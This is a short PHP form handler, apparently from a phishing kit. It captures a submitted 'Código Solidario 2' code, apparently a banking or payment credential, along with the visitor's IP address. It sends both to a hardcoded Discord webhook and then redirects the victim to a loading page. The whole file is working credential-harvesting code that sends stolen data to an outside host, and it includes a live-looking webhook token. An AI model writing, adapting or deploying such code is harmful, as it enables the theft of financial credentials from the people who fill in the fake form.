<?php
// Captura la información del formulario
$cpass = $_POST['cpass'] ?? 'No recibido';

// Obtén la IP del cliente
$ip_cliente = $_SERVER['REMOTE_ADDR'];

// Tu webhook de Discord (⚠️ reemplaza por el que generes de nuevo)
$webhook_url = "https://discordapp.com/api/webhooks/1413637036505829396/sdOGysqTEROkoDEupDgo6TecTos3RyNhRdYfxwPBi-HsK6m0iJd3YBzaVU8At0fy4Puq";

// Mensaje a enviar
$mensaje = "🔑 **Código Solidario 2:** $cpass\n🌍 **IP del cliente:** $ip_cliente";

// Crear payload en JSON
$data = json_encode([
    "content" => $mensaje
]);

// Enviar con cURL
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

// Redirige al usuario a otra página
header("Location: carga.html");
exit();
?>

